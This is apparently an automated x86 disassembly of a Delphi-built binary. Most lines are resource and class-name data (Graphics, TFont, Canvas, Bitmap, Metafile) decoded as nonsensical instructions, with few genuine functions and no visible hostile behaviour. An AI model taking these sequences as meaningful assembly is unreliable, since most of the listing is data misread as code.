jbe r-xdata
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ eax + 0x12 ] ax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x12 ] al
inc edx
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
jae r-xdata
popad
insd
nop
mov ah 0x12
inc edx
add [ ecx ] al
or al 0x54
inc esi
push esp
je r-xdata
imul esp [ ebx + 0x4f ] 0x61726570
jo r-xdata
inc eax
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
jae r-xdata
outsb
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
pushad
adc al [ edx ]
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
je r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ ebx + edx + 0x70070042 ] bl
insd
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
rcl [ edx ] 0x1
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ edx + edx + 0x42 ] bl
add [ ecx ] cl
jo r-xdata
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah cl
adc al [ edx ]
push es
jae r-xdata
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x4212a490
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
insd
push edi
push 0x5657469
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
popa
jne r-xdata
adc al [ edx ]
mov eax eax
cmp [ ebx ] dl
inc edx
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
outsd
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
dec esi
outsd
je r-xdata
dec esi
outsd
pop es
jo r-xdata
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
int3
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ ebx + edx ] dh
inc edx
add [ edi ] al
jo r-xdata
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
add [ ecx ] al
add ch bh
jae r-xdata
jae r-xdata
popad
jae r-xdata
push es
jo r-xdata
je r-xdata
outsd
je r-xdata
pop eax
dec esi
jo r-xdata
inc esp
outsd
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x1320c08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
pop es
jo r-xdata
jo r-xdata
add eax 0x6f4e6d70
inc esp
popad
jae r-xdata
sub al [ edx ]
andps xmm0 [ edi + 0x72 ]
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
jb r-xdata
inc ebx
outsd
jo r-xdata
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
pop es
jb r-xdata
insd
outsd
jo r-xdata
mov eax eax
pop esp
adc al 0x42
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
dec eax
adc eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x15
inc edx
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x4213a090
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x15 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x15340042 ] ch
jae r-xdata
rcr [ esp + edx + 0x42 ] 0x0
add ecx [ ebx ]
push esp
inc edx
jb r-xdata
push 0x8b736369
push eax
outsb
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
int3
popad
jb r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
nop
inc edi
and [ 0x42 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
add [ eax ] bl
add [ eax ] al
add [ edi + edi * 2 + 0x41 ] al
jpe r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ ebx ] al
imul esp [ ebx + 0x73 ] 0x145cc08b
inc edx
or [ eax + 0x6d ] esi
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
inc edx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
arpl [ eax + ecx * 2 + 0x15 ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
push 0x65
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax + 0x14 ] bl
inc edx
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
dec ebp
push eax
outsb
insb
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
and al 0x16
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
push ss
inc edx
add [ edx ] bl
push ss
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + 0x15 ] si
inc edx
add [ eax + 0x417f ] bh
add [ eax ] cl
inc edi
jb r-xdata
[ eax ]
jo r-xdata
inc ecx
outsb
je r-xdata
outsd
popad
insb
dec esi
outsd
je r-xdata
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edi ] dl
inc ecx
add [ eax + ebp * 4 ] ah
inc ecx
add [ eax + ebp * 4 ] ch
inc ecx
add [ eax - 0x59 ] al
inc ecx
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
dec ebp
popad
jae r-xdata
inc edx
add [ eax + eax ] ah
add [ eax ] al
aam 0x14
inc edx
sbb dl [ esi ]
jo r-xdata
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x42152090
add [ edx + 0x180042 ] dh
add [ eax ] al
inc esp
jg r-xdata
insb
dec ebp
jb r-xdata
outsb
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
adc al 0x42
imul esp [ ebx + 0x73 ] 0xc08b0000
je r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
inc edx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x15 ] dh
jo r-xdata
inc ecx
add [ eax + ebp * 4 ] ch
inc ecx
add [ ebp + ebp + 0x42 ] bh
inc eax
add al dl
xor [ eax ] eax
cmp [ 0xffffffffa8240042 ] ch
imul sp [ ebp + 0x72 ] 0x117c
add [ eax ] al
jo r-xdata
imul esp [ ebx + 0x73 ] 0xffff0001
nop
hlt
push ss
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
jmp [ eax + 0x2d ]
inc edx
add [ edi ] al
add eax 0x6e6f4654
je r-xdata
and al 0x16
adc eax 0x15440042
inc edx
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
add al [ eax ]
push es
dec eax
jo r-xdata
push eax
imul esi [ ebx + 0x68 ] r-xdata
cmp al 0x31
inc edx
add [ eax + 0x31 ] bl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
js r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
popad
insd
pop esp
adc al [ edx ]
mov al 0x31
inc edx
add [ eax + 0x1004231 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
xor [ edx ] al
loopne r-xdata
mov al [ 0xffffffffc8004212 ]
imul esp [ ebx + 0x73 ] 0x12b00007
inc edx
add al ah
xor [ edx ] eax
call 0x142587e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc edx
add [ ecx + esi + 0x10042 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ 0x6c797453 ] al
lea eax [ eax ]
jo r-xdata
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax ] bh
sub eax 0xa8240042
adc [ edx ] eax
sbb [ eax ] al
add bh bh
mov eax 0x100422e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050001 ] al
outsd
insb
outsd
jb r-xdata
xor al 0x40
add [ esp + esi + 0x40 ] ch
inc edx
add [ eax + eax ] bl
add [ eax ] al
aam 0x14
inc edx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx + 0x42 ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4217 ] cl
add [ eax ] al
add [ eax ] al
add eax 0x63746950
push r-xdata
add [ eax ] al
add [ eax + eax ] al
imul esp [ gs : edi + 0x68 ] 0x4212a074
add al cl
adc [ eax ] al
cwde
xor [ edx ] al
mov al [ 0x1004230 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
pushfd
xor eax [ edx ]
movsb [ edi ] [ esi ]
xor eax [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
add [ ebp + edx + 0x42 ] al
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi + 0x42 ] dl
add [ eax + ebp * 4 ] ah
inc ecx
add [ eax + ebp * 4 ] ch
inc ecx
add [ edx + esi + 0x42 ] bh
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
mov [ edi ] dl
inc edx
add [ edi ] al
add al 0x54
push eax
outsb
jo r-xdata
insb
xor al 0x40
adc eax [ edx ]
sbb [ eax ] al
add bh bh
xor al 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 + 0x3465646f ] al
adc eax [ edx ]
js r-xdata
test al 0x34
inc edx
add [ eax + 0x1004234 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
imul esp [ ebx + 0x73 ] 0x11800004
inc edx
add [ ebx + esi + 0x33a40042 ] bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x74646957
push 0x1870c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4218 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx + 0x42 ] bh
add [ eax ] bl
add [ eax ] al
add ah dl
adc al 0x42
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ esi - 0x57dbffbe ] bl
inc ecx
add [ eax + ebp * 4 ] ch
inc ecx
add [ ebp + esi + 0x42 ] al
add [ esi ] al
push esp
inc edx
jb r-xdata
inc edx
add [ eax + 0x1004234 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
push esp
adc [ eax ] al
add [ eax ] al
jae r-xdata
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x19 ] bl
inc edx
add [ eax ] al
add [ eax ] al
nop
mov [ eax ] bl
inc edx
add [ edi ] al
push es
push esp
inc edx
jb r-xdata
add al 0x24
retn
outsd
and [ gs : esi ] dl
inc edx
add [ eax + eax ] cl
add bh bh
add [ ecx ] al
add [ eax ] cl
inc ebx
outsd
sbb [ edx ] eax
pop es
pop es
push esp
inc ebx
popad
pop eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ ecx + ebx + 0x42 ] cl
add [ eax ] bl
add [ eax ] al
inc esp
jg r-xdata
jae r-xdata
outsb
jbe r-xdata
pop ss
inc edx
add [ eax ] dl
add [ eax ] al
add al 0xdc
jmp r-xdata
dec ebp
in al dx
cmp al 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
jae r-xdata
pop eax
sbb [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jo r-xdata
push esp
adc [ eax ] al
sbb [ edx ] eax
mov eax 0x400417f
add [ eax ] cl
inc edi
jb r-xdata
inc edx
inc edx
add [ ebp + edx + 0x42 ] al
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
outsd
outsb
je r-xdata
add [ edx ] 0x0
add al 0x46
jo r-xdata
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax + 0x24004238 ] bl
test al 0x41
add [ eax + ebp * 4 ] ch
inc ecx
add [ eax - 0x59 ] al
inc ecx
add [ eax ] ch
aas
inc edx
add [ edi + edi ] dl
inc edx
add [ eax + 0x3e ] cl
inc edx
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
inc eax
adc al 0x42
add [ eax - 0x5fffbdc9 ] bl
aaa
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
xor al 0x19
inc edx
add [ eax ] al
add [ eax ] al
jo r-xdata
pop ebp
retn 0x4
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
imul esp [ ebx + 0x73 ] 0x18840004
inc edx
add [ eax + eax ] dl
add bh bh
or [ 0x10042 ] bh
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add eax 0x73757242
push r-xdata
dec esp
sbb [ edx ] eax
pop eax
add [ eax ] al
add [ edi + edi * 2 + 0x41 ] al
add [ esi + esi + 0x10042 ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xffffff ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
imul esp [ ebx + 0x73 ] 0x11800002
inc edx
add [ esi + esi + 0x42 ] bh
sub_4215ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dl
inc edx
add [ esi + edx ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
push ss
inc edx
add [ edx ] bl
push ss
inc edx
add [ eax + eax ] ah
add [ eax ] al
aam 0x14
inc edx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax ] bh
sub eax 0xa8240042
inc ecx
add [ eax + ebp * 4 ] ch
inc ecx
add [ ebp + ebp + 0x42 ] bh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x15 ] dh
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
jmp [ eax + 0x2d ]
sub_421b20
fcom [ ebp + 0x42 ]
add [ eax ] cl
push esp
inc edi
jb r-xdata
sbb eax [ gs : edx ]
jae r-xdata
jo r-xdata
fiadd [ eax ]
ror [ edi + 0x60 ] 0xb2
fisttp [ edx + 0x2800421b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x421c0cc0 ] cl
inc edx
add [ ebp + 0x1b ] bh
inc edx
add [ ebp + 0x1b ] dl
inc edx
add [ ebp + 0x1b ] bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
sbb eax [ edx ]
push ebp
sbb eax [ edx ]
pop ebp
sbb eax [ edx ]
add [ eax ] eax
add [ eax ] al
mov [ 0x7ab8cd12 ] eax
imul esp [ ebx - 0x73 ] 0x1b340040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
int 0xb8
jpe r-xdata
imul esp [ ebx - 0x48 ] 0xb800421a
add [ ecx ] 0x0
add [ eax ] cl
inc edi
jb r-xdata
inc edx
add [ esp + ebx + 0x42 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
sbb al 0x42
add [ esp + ebx ] bh
inc edx
add [ eax + eax ] ch
add [ eax ] al
xor al 0x80
inc ecx
add [ esp + esi + 0x40 ] ah
add ah ah
test al 0x41
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ ebx + ebx * 2 + 0x5bec0042 ] bh
inc edx
add [ eax + 0x60 ] ch
inc edx
add [ ebp + ebx * 2 - 0x568bffbe ] ch
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x15 ] dh
inc edx
add [ eax ] bl
add [ eax ] al
add [ edx ] al
add ch bh
sbb edx 0x0
aam 0x11
jo r-xdata
add [ esi + 0x421b ] bl
add [ eax ] al
add [ esp + ebx ] bl
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
or al 0x1c
inc edx
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp sub_425d7c
sub_421c36
inc edx
add [ eax + 0x5e ] dl
inc edx
add [ eax ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x8d657275
inc eax
add [ esp + ebx + 0x42 ] cl
add [ edi ] al
or [ eax + edx * 2 + 0x69 ] dl
arpl [ ebp + esi * 2 + 0x72 ] si
or al 0x1c
inc edx
add [ eax + 0x4180 ] bh
add [ eax ] cl
inc edi
jb r-xdata
aas
inc edx
add [ edi + edi ] dl
inc edx
add [ eax + 0x3e ] cl
jo r-xdata
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
imul bp [ ebp + 0x43 ] 0x6e61
jbe r-xdata
inc edx
add [ edi ] cl
push esp
dec ebp
je r-xdata
imul esp [ ebx + 0x73 ] 0xb8900000
sbb al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
sbb al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
sbb al 0x42
add [ eax + eax ] bl
add al ch
sbb [ edx ] al
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ esp ] cl
add [ ecx + ebp * 4 + 0x41 ] dh
add [ ebx + edx * 2 + 0x42 ] bh
add [ ebp + 0x42 ] ah
add [ eax ] bh
push esp
inc edx
add ah bl
inc dx
add ah dh
inc dx
add [ eax - 0x7bffbd99 ] cl
push ebp
inc edx
add [ eax + ebp * 2 ] dl
inc edx
add ah dh
push 0x6d200042
inc edx
add [ eax + 0x56 ] ch
inc edx
add [ esi + ebp * 2 ] cl
inc edx
add [ eax ] dl
outsb
inc edx
add [ eax + 0x6f ] ch
inc edx
add [ eax + 0x64 ] bl
inc edx
add [ eax - 0x4fffbdab ] cl
imul eax [ edx ] 0x78
push 0x6c740042
inc edx
add [ ecx + esi * 2 + 0x72400042 ] bh
inc edx
add [ ecx ] cl
push esp
dec ebp
je r-xdata
imul bp [ ebp + 0x49 ] 0x616d
nop
sbb [ esi ] bl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx + 0x42 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
je r-xdata
jae r-xdata
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ esi + esi * 2 + 0x42 ] ch
imul bp [ ebp - 0x75 ] 0x8cc0
push ds
inc edx
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
mov ah 0x31
inc eax
add al dl
xor [ eax ] eax
mov al [ 0x24004264 ]
test al 0x41
add ah ch
push ebx
inc edx
add al dl
inc edx
inc edx
add [ eax ] dh
add [ eax ] al
add [ edx + ebx + 0x42 ] ch
add [ esp + esi + 0x40 ] ah
add ah ah
test al 0x41
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax + 0x24004264 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah ah
pushad
inc edx
add [ eax ] ah
popad
inc edx
add [ esi ] cl
push esp
dec ebp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x2400421d
add [ eax ] al
add [ ebx + 0x34640042 ] cl
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
sbb al 0x42
add [ edi ] al
andps xmm1 [ ebp + 0x65 ]
je r-xdata
test al 0x41
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax - 0x7f ] bl
inc edx
add [ eax + ebp * 4 ] ah
inc ecx
add ah ch
push ebx
inc edx
add [ ecx + eax * 4 - 0x568bffbe ] dl
inc ecx
add [ eax - 0x7d ] ch
inc edx
add al ch
add [ edx ] 0x38
push esp
inc edx
add [ esi + eax * 4 - 0x78afffbe ] bl
inc edx
add [ eax - 0x7bffbd79 ] dl
push ebp
inc edx
add ah ch
xchg [ edx ] eax
fmul [ ebx - 0x6c2bffbe ]
inc edx
add [ eax + 0x6c004294 ] ch
push esi
inc edx
add [ ebp + edx * 4 + 0x42 ] bh
add al dl
xchg ebp eax
inc edx
add al dh
add [ edx ] 0x88
push ebp
inc edx
add [ eax ] dl
push esi
inc edx
add [ edx + ecx * 4 - 0x6717ffbe ] dh
inc edx
add [ eax ] dh
mov al [ edx ]
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
pop eax
pop ds
inc edx
insb
jbe r-xdata
imul bp [ ebp + 0x18 ] 0x421e
add [ eax ] dh
sbb eax [ edx ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
inc eax
add [ edx + ebp ] bl
mov ah 0x31
inc eax
add al dl
xor [ eax ] eax
or al 0x32
imul bp [ ebp + 0x43 ] 0x6e61
jbe r-xdata
add ah ah
xor al 0x40
add al cl
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
pop ds
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
pop ds
inc edx
add [ eax + eax ] bh
add [ eax ] al
insb
sbb al [ edx ]
xor al 0x40
imul esp [ ebx + 0x73 ] 0x1ef80000
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
push ds
inc edx
add [ eax + eax ] dh
add [ ebx + 0x34640042 ] cl
inc eax
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
inc eax
add [ esp + edx * 2 ] cl
push ebx
push 0x64657261
dec ecx
insd
popad
lea eax [ bx + si ]
mov eax 0x421d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebx + 0x240042 ] bh
add [ eax ] al
or al 0x1d
inc edx
add [ esp + esi + 0x40 ] ah
xor al [ eax ]
